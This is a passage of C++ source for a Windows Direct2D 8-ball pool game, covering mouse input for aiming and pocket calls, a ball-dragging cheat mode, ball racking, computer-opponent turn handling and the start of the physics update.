                    // STAGE 2, STEP 2: A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to a generic aiming state.
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message.
                    isAiming = true; // Prepare for aiming.
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable.
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }

            /*// --- FOOLPROOF FIX: This block handles re-selectable pocket choice ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) { // Player clicked on a pocket
                    // FIX: Update the called pocket, but DO NOT change the game state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show updated arrow
                    return 0; // Consume the click and stay in CHOOSING_POCKET state
                }

                // FIX: Add new logic to CONFIRM the choice by clicking the cue ball.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to aiming, not PLAYER1_TURN
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }*/

            /*// --- handle pocket re-selection when choosing 8-ball pocket ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1)
                || (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI))
            {
                POINT pt = { LOWORD(lParam), HIWORD(lParam) };
                for (int i = 0; i < 6; ++i) {
                    float dx = pt.x - pocketPositions[i].x;
                    float dy = pt.y - pocketPositions[i].y;
                    if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                        // 1) Record the call
                        if (currentPlayer == 1) calledPocketP1 = i;
                        else                  calledPocketP2 = i;
                        // 2) Clear any prompt text
                        pocketCallMessage.clear();
                        // 3) Return to normal aiming state
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        // 4) Redraw (arrow stays because calledPocketP* >= 0)
                        InvalidateRect(hwnd, NULL, FALSE);
                        return 0; // consume click
                    }
                }
                return 0; // clicked outside ? stay in pocket?call until a valid pocket is chosen
            }*/

            // … rest of your click?to?aim logic …

            //replaced /w new code
            /*
            // --- FIX: Add this entire block at the top of WM_LBUTTONDOWN ---
    // This handles input specifically for the pocket selection state.
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // A pocket was clicked. Update the selection but STAY in the choosing state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and wait for the next action.
                }

                // If the player clicks the CUE BALL, that confirms their pocket selection.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }
            // --- END OF THE NEW BLOCK ---
            */
            //new code ends here

            if (cheatModeEnabled) {
                // Allow dragging any ball freely
                for (Ball& ball : balls) {
                    float distSq = GetDistanceSq(ball.x, ball.y, (float)ptMouse.x, (float)ptMouse.y);
                    if (distSq <= BALL_RADIUS * BALL_RADIUS * 4) { // Click near ball
                        isDraggingCueBall = true;
                        draggingBallId = ball.id;
                        if (ball.id == 0) {
                            // If dragging cue ball manually, ensure we stay in Ball-In-Hand state
                            if (currentPlayer == 1)
                                currentGameState = BALL_IN_HAND_P1;
                            else if (currentPlayer == 2 && !isPlayer2AI)
                                currentGameState = BALL_IN_HAND_P2;
                        }
                        return 0;
                    }
                }
            }

            Ball* cueBall = GetCueBall(); // Declare and get cueBall pointer            

            // Check which player is allowed to interact via mouse click
            bool canPlayerClickInteract = ((currentPlayer == 1) || (currentPlayer == 2 && !isPlayer2AI));
            // Define states where interaction is generally allowed
            bool canInteractState = (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == AIMING || currentGameState == BREAKING ||
                currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT);

            // Check Spin Indicator first (Allow if player's turn/aim phase)
            if (canPlayerClickInteract && canInteractState) {
                float spinDistSq = GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, spinIndicatorCenter.x, spinIndicatorCenter.y);
                if (spinDistSq < spinIndicatorRadius * spinIndicatorRadius * 1.2f) {
                    isSettingEnglish = true;
                    float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                    float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                    float dist = GetDistance(dx, dy, 0, 0);
                    if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                    cueSpinX = dx / spinIndicatorRadius;
                    cueSpinY = dy / spinIndicatorRadius;
                    isAiming = false; isDraggingStick = false; isDraggingCueBall = false;
                    return 0;
                }
            }

            if (!cueBall) return 0;

            // Check Ball-in-Hand placement/drag
            bool isPlacingBall = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
            bool isPlayerAllowedToPlace = (isPlacingBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                    (currentGameState == PRE_BREAK_PLACEMENT))); // Allow current player in break setup

            if (isPlayerAllowedToPlace) {
                float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                if (distSq < BALL_RADIUS * BALL_RADIUS * 9.0f) {
                    isDraggingCueBall = true;
                    isAiming = false; isDraggingStick = false;
                }
                else {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                        cueBall->x = (float)ptMouse.x; cueBall->y = (float)ptMouse.y;
                        cueBall->vx = 0; cueBall->vy = 0;
                        isDraggingCueBall = false;
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                    }
                }
                return 0;
            }

            // Check for starting Aim (Cue Ball OR Stick)
            bool canAim = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BREAKING)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BREAKING)));

            if (canAim) {
                const float stickDrawLength = 150.0f * 1.4f;
                float currentStickAngle = cueAngle + PI;
                D2D1_POINT_2F currentStickEnd = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * stickDrawLength, cueBall->y + sinf(currentStickAngle) * stickDrawLength);
                D2D1_POINT_2F currentStickTip = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * 5.0f, cueBall->y + sinf(currentStickAngle) * 5.0f);
                float distToStickSq = PointToLineSegmentDistanceSq(D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y), currentStickTip, currentStickEnd);
                float stickClickThresholdSq = 36.0f;
                float distToCueBallSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                float cueBallClickRadiusSq = BALL_RADIUS * BALL_RADIUS * 25;

                bool clickedStick = (distToStickSq < stickClickThresholdSq);
                bool clickedCueArea = (distToCueBallSq < cueBallClickRadiusSq);

                if (clickedStick || clickedCueArea) {
                    isDraggingStick = clickedStick && !clickedCueArea;
                    isAiming = clickedCueArea;
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    shotPower = 0;
                    float dx = (float)ptMouse.x - cueBall->x;
                    float dy = (float)ptMouse.y - cueBall->y;
                    if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                    if (currentGameState != BREAKING) currentGameState = AIMING;
                }
            }
            return 0;
        } // End WM_LBUTTONDOWN


        case WM_LBUTTONUP: {
            // --- FOOLPROOF FIX for Cheat Mode Scoring ---
            if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- This is the new, ""smarter"" logic ---
                            b->isPocketed = true; // Pocket the ball visually.

                            // If the table is open, assign types based on this cheated ball.
                            if (player1Info.assignedType == BallType::NONE && b->id != 0 && b->id != 8) {
                                AssignPlayerBallTypes(b->type, false);
                            }

                            // Now, correctly update the score for the right player.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            break; // Stop checking pockets.
                        }
                    }
                }
            }

            /*if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- Assign ball type on first cheat-pocket if table still open ---
                            if (player1Info.assignedType == BallType::NONE
                                && player2Info.assignedType == BallType::NONE
                                && (b->type == BallType::SOLID || b->type == BallType::STRIPE))
                            {
                                // In cheat mode, let's just assign to the current player
                                AssignPlayerBallTypes(b->type);
                            }
                            b->isPocketed = true;
                            pocketedThisTurn.push_back(b->id);

                            // --- FIX FOR CHEAT MODE SCORING ---
                            // Immediately increment the correct player's count based on ball type,
                            // not whose turn it is.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            // --- END FIX ---
                            // --- NEW: If this was the 7th ball, trigger the arrow call UI ---
                            if (b->id != 8) {
                                PlayerInfo& shooter = (currentPlayer == 1 ? player1Info : player2Info);
                                if (shooter.ballsPocketedCount >= 7
                                    && calledPocketP1 < 0
                                    && calledPocketP2 < 0)
                                {
                                    currentGameState = (currentPlayer == 1)
                                        ? CHOOSING_POCKET_P1
                                        : CHOOSING_POCKET_P2;
                                }
                                else {
                                    // For any other cheat?pocket, keep the turn so you can continue aiming
                                    currentGameState = (currentPlayer == 1)
                                        ? PLAYER1_TURN
                                        : PLAYER2_TURN;
                                }
                            }
                            // --- NEW: If it was the 8-Ball, award instant victory ---
                            else {
                                currentGameState = GAME_OVER;
                                gameOverMessage = (currentPlayer == 1 ? player1Info.name : player2Info.name)
                                    + std::wstring(L"" Wins!"");
                            }
                            break;
                        }
                    }
                }
            }*/

            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            Ball* cueBall = GetCueBall(); // Get cueBall pointer

            // Check for releasing aim drag (Stick OR Cue Ball)
            if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                bool wasAiming = isAiming;
                bool wasDraggingStick = isDraggingStick;
                isAiming = false; isDraggingStick = false;

                if (shotPower > 0.15f) { // Check power threshold
                    if (currentGameState != AI_THINKING) {
                        firstHitBallIdThisShot = -1; cueHitObjectBallThisShot = false; railHitAfterContact = false; // Reset foul flags
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                        ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);
                        currentGameState = SHOT_IN_PROGRESS;
                        foulCommitted = false; pocketedThisTurn.clear();
                    }
                }
                else if (currentGameState != AI_THINKING) { // Revert state if power too low
                    if (currentGameState == BREAKING) { /* Still breaking */ }
                    else {
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = false;
                    }
                }
                shotPower = 0; // Reset power indicator regardless
            }

            // Handle releasing cue ball drag (placement)
            if (isDraggingCueBall) {
                isDraggingCueBall = false;
                // Check player allowed to place
                bool isPlacingState = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
                bool isPlayerAllowed = (isPlacingState &&
                    ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                        (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                        (currentGameState == PRE_BREAK_PLACEMENT)));

                if (isPlayerAllowed && cueBall) {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition(cueBall->x, cueBall->y, behindHeadstring)) {
                        // Finalize position already set by mouse move
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                        /* ----------------------------------------------------
                        If the player who now has the turn is already on the
                        8-ball, immediately switch to pocket-selection state.
                        ---------------------------------------------------- */
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        {
                            CheckAndTransitionToPocketChoice(currentPlayer);
                        }
                    }
                    else { /* Stay in BALL_IN_HAND state if final pos invalid */ }
                }
            }

            // Handle releasing english setting
            if (isSettingEnglish) {
                isSettingEnglish = false;
            }
            return 0;
        } // End WM_LBUTTONUP

        case WM_DESTROY:
            isMusicPlaying = false;
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
                SaveSettings(); // Save settings on exit
            }
            PostQuitMessage(0);
            return 0;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }
        return 0;
    }

    // --- Direct2D Resource Management ---

    HRESULT CreateDeviceResources() {
        HRESULT hr = S_OK;

        // Create Direct2D Factory
        if (!pFactory) {
            hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
            if (FAILED(hr)) return hr;
        }

        // Create DirectWrite Factory
        if (!pDWriteFactory) {
            hr = DWriteCreateFactory(
                DWRITE_FACTORY_TYPE_SHARED,
                __uuidof(IDWriteFactory),
                reinterpret_cast<IUnknown**>(&pDWriteFactory)
            );
            if (FAILED(hr)) return hr;
        }

        // Create Text Formats
        if (!pTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                16.0f, L""en-us"", &pTextFormat
            );
            if (FAILED(hr)) return hr;
            // Center align text
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }
        if (!pLargeTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Impact"", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                48.0f, L""en-us"", &pLargeTextFormat
            );
            if (FAILED(hr)) return hr;
            pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING); // Align left
            pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }


        // Create Render Target (needs valid hwnd)
        if (!pRenderTarget && hwndMain) {
            RECT rc;
            GetClientRect(hwndMain, &rc);
            D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top);

            hr = pFactory->CreateHwndRenderTarget(
                D2D1::RenderTargetProperties(),
                D2D1::HwndRenderTargetProperties(hwndMain, size),
                &pRenderTarget
            );
            if (FAILED(hr)) {
                // If failed, release factories if they were created in this call
                SafeRelease(&pTextFormat);
                SafeRelease(&pLargeTextFormat);
                SafeRelease(&pDWriteFactory);
                SafeRelease(&pFactory);
                pRenderTarget = nullptr; // Ensure it's null on failure
                return hr;
            }
        }

        return hr;
    }

    void DiscardDeviceResources() {
        SafeRelease(&pRenderTarget);
        SafeRelease(&pTextFormat);
        SafeRelease(&pLargeTextFormat);
        SafeRelease(&pDWriteFactory);
        // Keep pFactory until application exit? Or release here too? Let's release.
        SafeRelease(&pFactory);
    }

    void OnResize(UINT width, UINT height) {
        if (pRenderTarget) {
            D2D1_SIZE_U size = D2D1::SizeU(width, height);
            pRenderTarget->Resize(size); // Ignore HRESULT for simplicity here
        }
    }

    // --- Game Initialization ---
    void InitGame() {
        srand((unsigned int)time(NULL)); // Seed random number generator
        isOpeningBreakShot = true; // This is the start of a new game, so the next shot is an opening break.
        aiPlannedShotDetails.isValid = false; // Reset AI planned shot
        aiIsDisplayingAim = false;
        aiAimDisplayFramesLeft = 0;
        // ... (rest of InitGame())

        // --- Ensure pocketed list is clear from the absolute start ---
        pocketedThisTurn.clear();

        balls.clear(); // Clear existing balls

        // Reset Player Info (Names should be set by Dialog/wWinMain/ResetGame)
        player1Info.assignedType = BallType::NONE;
        player1Info.ballsPocketedCount = 0;
        // Player 1 Name usually remains ""Player 1""
        player2Info.assignedType = BallType::NONE;
        player2Info.ballsPocketedCount = 0;
        // Player 2 Name is set based on gameMode in ShowNewGameDialog
            // --- Reset any 8?Ball call state on new game ---
        lastEightBallPocketIndex = -1;
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage = L"""";
        aiPlannedShotDetails.isValid = false; // THIS IS THE CRITICAL FIX: Reset the AI's plan.

        // Create Cue Ball (ID 0)
        // Initial position will be set during PRE_BREAK_PLACEMENT state
        balls.push_back({ 0, BallType::CUE_BALL, TABLE_LEFT + TABLE_WIDTH * 0.15f, RACK_POS_Y, 0, 0, CUE_BALL_COLOR, false });

        // --- Create Object Balls (Temporary List) ---
        std::vector<Ball> objectBalls;
        // Solids (1-7, Yellow)
        for (int i = 1; i <= 7; ++i) {
            objectBalls.push_back({ i, BallType::SOLID, 0, 0, 0, 0, SOLID_COLOR, false });
        }
        // Stripes (9-15, Red)
        for (int i = 9; i <= 15; ++i) {
            objectBalls.push_back({ i, BallType::STRIPE, 0, 0, 0, 0, STRIPE_COLOR, false });
        }
        // 8-Ball (ID 8) - Add it to the list to be placed
        objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false });


        // --- Racking Logic (Improved) ---
        float spacingX = BALL_RADIUS * 2.0f * 0.866f; // cos(30) for horizontal spacing
        float spacingY = BALL_RADIUS * 2.0f * 1.0f;   // Vertical spacing

        // Define rack positions (0-14 indices corresponding to triangle spots)
        D2D1_POINT_2F rackPositions[15];
        int rackIndex = 0;
        for (int row = 0; row < 5; ++row) {
            for (int col = 0; col <= row; ++col) {
                if (rackIndex >= 15) break;
                float x = RACK_POS_X + row * spacingX;
                float y = RACK_POS_Y + (col - row / 2.0f) * spacingY;
                rackPositions[rackIndex++] = D2D1::Point2F(x, y);
            }
        }

        // Separate 8-ball
        Ball eightBall;
        std::vector<Ball> otherBalls; // Solids and Stripes
        bool eightBallFound = false;
        for (const auto& ball : objectBalls) {
            if (ball.id == 8) {
                eightBall = ball;
                eightBallFound = true;
            }
            else {
                otherBalls.push_back(ball);
            }
        }
        // Ensure 8 ball was actually created (should always be true)
        if (!eightBallFound) {
            // Handle error - perhaps recreate it? For now, proceed.
            eightBall = { 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false };
        }


        // Shuffle the other 14 balls
        // Use std::shuffle if available (C++11 and later) for better randomness
        // std::random_device rd;
        // std::mt19937 g(rd());
        // std::shuffle(otherBalls.begin(), otherBalls.end(), g);
        std::random_shuffle(otherBalls.begin(), otherBalls.end()); // Using deprecated for now

        // --- Place balls into the main 'balls' vector in rack order ---
        // Important: Add the cue ball (already created) first.
        // (Cue ball added at the start of the function now)

        // 1. Place the 8-ball in its fixed position (index 4 for the 3rd row center)
        int eightBallRackIndex = 4;
        eightBall.x = rackPositions[eightBallRackIndex].x;
        eightBall.y = rackPositions[eightBallRackIndex].y;
        eightBall.vx = 0;
        eightBall.vy = 0;
        eightBall.isPocketed = false;
        balls.push_back(eightBall); // Add 8 ball to the main vector

        // 2. Place the shuffled Solids and Stripes in the remaining spots
        size_t otherBallIdx = 0;
        //int otherBallIdx = 0;
        for (int i = 0; i < 15; ++i) {
            if (i == eightBallRackIndex) continue; // Skip the 8-ball spot

            if (otherBallIdx < otherBalls.size()) {
                Ball& ballToPlace = otherBalls[otherBallIdx++];
                ballToPlace.x = rackPositions[i].x;
                ballToPlace.y = rackPositions[i].y;
                ballToPlace.vx = 0;
                ballToPlace.vy = 0;
                ballToPlace.isPocketed = false;
                balls.push_back(ballToPlace); // Add to the main game vector
            }
        }
        // --- End Racking Logic ---


        // --- Determine Who Breaks and Initial State ---
        if (isPlayer2AI) {
            /*// AI Mode: Randomly decide who breaks
            if ((rand() % 2) == 0) {
                // AI (Player 2) breaks
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT; // AI needs to place ball first
                aiTurnPending = true; // Trigger AI logic
            }
            else {
                // Player 1 (Human) breaks
                currentPlayer = 1;
                currentGameState = PRE_BREAK_PLACEMENT; // Human places cue ball
                aiTurnPending = false;*/
            switch (openingBreakMode) {
            case CPU_BREAK:
                currentPlayer = 2; // AI breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            case P1_BREAK:
                currentPlayer = 1; // Player 1 breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = false;
                break;
            case FLIP_COIN_BREAK:
                if ((rand() % 2) == 0) { // 0 for AI, 1 for Player 1
                    currentPlayer = 2; // AI breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = true;
                }
                else {
                    currentPlayer = 1; // Player 1 breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = false;
                }
                break;
            default: // Fallback to CPU break
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            }
        }
        else {
            // Human vs Human, Player 1 always breaks (or could add a flip coin for HvsH too if desired)
            currentPlayer = 1;
            currentGameState = PRE_BREAK_PLACEMENT;
            aiTurnPending = false; // No AI involved
        }

        // Reset other relevant game state variables
        foulCommitted = false;
        gameOverMessage = L"""";
        firstBallPocketedAfterBreak = false;
        // pocketedThisTurn cleared at start
        // Reset shot parameters and input flags
        shotPower = 0.0f;
        cueSpinX = 0.0f;
        cueSpinY = 0.0f;
        isAiming = false;
        isDraggingCueBall = false;
        isSettingEnglish = false;
        cueAngle = 0.0f; // Reset aim angle
        visualCueAngle = cueAngle;
        visualShotPower = shotPower;
    }


    // --------------------------------------------------------------------------------
    // Full GameUpdate(): integrates AI call?pocket ? aim ? shoot (no omissions)
    // --------------------------------------------------------------------------------
    void GameUpdate() {
        // --- 1) Handle an in?flight shot ---
        if (currentGameState == SHOT_IN_PROGRESS) {
            UpdatePhysics();
            // ? clear old 8?ball pocket info before any new pocket checks
            //lastEightBallPocketIndex = -1;
            CheckCollisions();
            CheckPockets(); // FIX: This line was missing. It's essential to check for pocketed balls every frame.

            if (AreBallsMoving()) {
                isAiming = false;
                aiIsDisplayingAim = false;
            }

            if (!AreBallsMoving()) {
                ProcessShotResults();
            }
            return;
        }

        // --- 2) CPU’s turn (table is static) ---
        if (isPlayer2AI && currentPlayer == 2 && !AreBallsMoving()) {
            // ??? If we've just auto?entered AI_THINKING for the 8?ball call, actually make the decision ???
            if (currentGameState == AI_THINKING && aiTurnPending) {
                aiTurnPending = false;        // consume the pending flag
                AIMakeDecision();             // CPU calls its pocket or plans its shot
                return;                       // done this tick
            }

            // ??? Automate the AI pocket?selection click ???
            if (currentGameState == CHOOSING_POCKET_P2) {
                // AI immediately confirms its call and moves to thinking/shooting
                currentGameState = AI_THINKING;
                aiTurnPending = true;
                return; // process on next tick
            }
            // 2A) If AI is displaying its aim line, count down then shoot
            if (aiIsDisplayingAim) {
                aiAimDisplayFramesLeft--;
                if (aiAimDisplayFramesLeft <= 0) {
                    aiIsDisplayingAim = false;
                    if (aiPlannedShotDetails.isValid) {
                        firstHitBallIdThisShot = -1;
                        cueHitObjectBallThisShot = false;
                        railHitAfterContact = false;
                        std::thread([](const TCHAR* soundName) {
                            PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT);
                            }, TEXT(""cue.wav"")).detach();

                            ApplyShot(
                                aiPlannedShotDetails.power,
                                aiPlannedShotDetails.angle,
                                aiPlannedShotDetails.spinX,
                                aiPlannedShotDetails.spinY
                            );
                            aiPlannedShotDetails.isValid = false;
                    }
                    currentGameState = SHOT_IN_PROGRESS;
                    foulCommitted = false;
                    pocketedThisTurn.clear();
                }
                return;
            }

            // 2B) Immediately after calling pocket, transition into AI_THINKING
            if (currentGameState == CHOOSING_POCKET_P2 && aiTurnPending) {
                // Start thinking/shooting right away—no human click required
                currentGameState = AI_THINKING;
                aiTurnPending = false;
                AIMakeDecision();
                return;
            }

            // 2C) If AI has pending actions (break, ball?in?hand, or normal turn)
            if (aiTurnPending) {
                if (currentGameState == BALL_IN_HAND_P2) {
                    AIPlaceCueBall();
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                else if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
                    AIBreakShot();
                }
                else if (currentGameState == PLAYER2_TURN || currentGameState == BREAKING) {
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                return;
            }
        }
        // ------------------------------------------------------------
        //  Smooth presentation (critically-damped interpolation)
        // ------------------------------------------------------------
        auto Damp = [](float current, float target, float k)
        {
            return current + (target - current) * k;
        };

        visualCueAngle = Damp(visualCueAngle, cueAngle, AIM_SMOOTH_FACTOR);
        visualShotPower = Damp(visualShotPower, shotPower, AIM_SMOOTH_FACTOR);

        // keep angle inside 0..2π to stop jitter at wrap-around
        if (visualCueAngle < 0)         visualCueAngle += 2 * PI;
        else if (visualCueAngle > 2 * PI) visualCueAngle -= 2 * PI;
    }


    // --- Physics and Collision ---
    void UpdatePhysics() {
        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b = balls[i];
            if (!b.isPocketed) {
                b.x += b.vx;
                b.y += b.vy;

                // Apply friction
                b.vx *= FRICTION;
                b.vy *= FRICTION;

                // Stop balls if velocity is very low
                if (GetDistanceSq(b.vx, b.vy, 0, 0) < MIN_VELOCITY_SQ) {
                    b.vx = 0;
                    b.vy = 0;
                }

                /* -----------------------------------------------------------------
       Additional clamp to guarantee the ball never escapes the table.
       The existing wall–collision code can momentarily disable the
       reflection test while the ball is close to a pocket mouth;
       that rare case allowed it to ‘slide’ through the cushion and
       leave the board.  We therefore enforce a final boundary check
       after the normal physics step.
       ----------------------------------------------------------------- */
